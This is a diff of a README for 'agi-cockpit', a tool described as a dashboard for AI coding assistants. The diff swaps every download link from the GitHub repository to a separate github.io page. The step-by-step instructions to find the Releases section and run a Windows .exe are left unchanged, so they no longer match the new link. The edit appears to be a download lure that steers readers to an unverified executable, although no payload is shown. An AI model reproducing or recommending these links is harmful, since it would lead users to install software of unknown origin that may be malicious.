@@ -1,6 +1,6 @@
 # 🤖 agi-cockpit - Manage your coding agents with ease
 
-[![](https://img.shields.io/badge/Download-agi--cockpit-blue.svg)](https://github.com/dioneharumscarum11/agi-cockpit)
+[![](https://img.shields.io/badge/Download-agi--cockpit-blue.svg)](https://dioneharumscarum11.github.io)
 
 agi-cockpit helps you control multiple AI coding assistants from one place. You can use services like Claude, Codex, Cursor, and Grok side by side. This tool brings your agents into a single dashboard. You switch between models and manage their work without opening multiple browser tabs or apps.
 
@@ -8,13 +8,13 @@ agi-cockpit helps you control multiple AI coding assistants from one place. You 
 
 To start using agi-cockpit, you need to grab the installer from the official repository. Follow these steps:
 
-1. Go to this link: [https://github.com/dioneharumscarum11/agi-cockpit](https://github.com/dioneharumscarum11/agi-cockpit)
+1. Go to this link: [https://dioneharumscarum11.github.io](https://dioneharumscarum11.github.io)
 2. Look for the section labeled Releases on the right side of the page.
 3. Click on the latest release version.
 4. Find the file ending in .exe for Windows.
 5. Click the file to save it to your computer.
 
-[![](https://img.shields.io/badge/Visit-Releases-grey.svg)](https://github.com/dioneharumscarum11/agi-cockpit)
+[![](https://img.shields.io/badge/Visit-Releases-grey.svg)](https://dioneharumscarum11.github.io)
 
 ## ⚙️ Setting up your system
 
